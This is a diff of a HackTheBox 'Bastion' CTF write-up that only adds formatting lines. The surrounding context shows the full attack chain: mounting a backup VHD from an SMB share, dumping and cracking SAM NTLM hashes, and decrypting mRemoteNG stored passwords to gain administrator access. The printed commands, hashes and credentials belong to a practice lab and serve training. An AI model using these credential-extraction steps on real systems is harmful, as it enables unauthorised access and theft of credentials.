@@ -62,6 +62,7 @@ Host script results:
 |   date: 2024-01-05T08:31:18
 |_  start_date: 2024-01-04T09:35:25
 ```
+{: .nolineno}
 
 ## SMB Enumeration ⤵️
 
@@ -101,6 +102,7 @@ If using other virt tools, this disk image won’t work
 with these tools.  Use the guestfish equivalent commands
 (see the virt tool manual page).
 ```
+{: .nolineno}
 
 Now the second file :
 
@@ -108,6 +110,7 @@ Now the second file :
 ┌──(kali㉿kali)-[~/Downloads/HTB/Bastion/shares]
 └─$ sudo guestmount --add ~/Downloads/HTB/Bastion/shares/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd --inspector --ro /mnt/
 ```
+{: .nolineno}
 
 Now lets access that share `/mnt/` with `sudo` permissions →
 
@@ -130,6 +133,7 @@ drwxrwxrwx  1 root root       4096 Feb 22  2019 'System Volume Information'
 drwxrwxrwx  1 root root       4096 Feb 22  2019  Users
 drwxrwxrwx  1 root root      16384 Feb 22  2019  Windows
 ```
+{: .nolineno}
 
 Since I got the directory access so lets access the SAM value or hashdump for Users →
 
@@ -140,6 +144,7 @@ Since I got the directory access so lets access the SAM value or hashdump for Us
 *disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
 L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::
 ```
+{: .nolineno}
 
 with `samdump2 Tool` and arguments as `SAM` and `SYSTEM` I can access the NTLM hash of the users , Now lets crack that hash to get access →
 
@@ -176,10 +181,13 @@ Candidate.Engine.: Device Generator
 Candidates.#1....: burgers11 -> burbank105
 Hardware.Mon.#1..: Util: 47%
 ```
+{: .nolineno}
 
 ```
+{: .nolineno}
 L4mpje:bureaulampje
 ```
+{: .nolineno}
 
 Lets access the `ssh` shell →
 
@@ -215,6 +223,7 @@ SeIncreaseWorkingSetPrivilege Increase a process working set Enabled
 
 l4mpje@BASTION C:\Users\L4mpje>
 ```
+{: .nolineno}
 
 I noticed this `confCons.xml` file from this directory after so much recon `C:\Users\L4mpje\AppData\Roaming\mRemoteNG` →
 
@@ -247,12 +256,14 @@ l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG>dir
 
 l4mpje@BASTION C:\Users\L4mpje\AppData\Roaming\mRemoteNG> 
 ```
+{: .nolineno}
 
 ```bash
 Username="Administrator" Domain="" Password="aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw=="
 
 Username="L4mpje" Domain="" Password="yhgmiu5bbuamU3qMUKc/uYDdmbMrJZ/JvR1kYe4Bhiu8bXybLxVnO0U9fKRylI7NcB9QuRsZVvla8esB"
 ```
+{: .nolineno}
 
 [mRemoting_decrypter/mRemoteNG_decrypter.py · master · 0xdf / CTFScripts · GitLab](https://gitlab.com/0xdf/ctfscripts/-/blob/master/mRemoting_decrypter/mRemoteNG_decrypter.py?ref_type=heads)
 
@@ -269,6 +280,7 @@ Password: thXLHM96BeKL0ER2
 Username: L4mpje
 Password: bureaulampje
 ```
+{: .nolineno}
 
 I then logged into administrator account and got flag →
 
@@ -343,5 +355,6 @@ administrator@BASTION C:\Users\Administrator>type Desktop\root.txt
 
 administrator@BASTION C:\Users\Administrator>
 ```
+{: .nolineno}
 
 I am administrator now !!
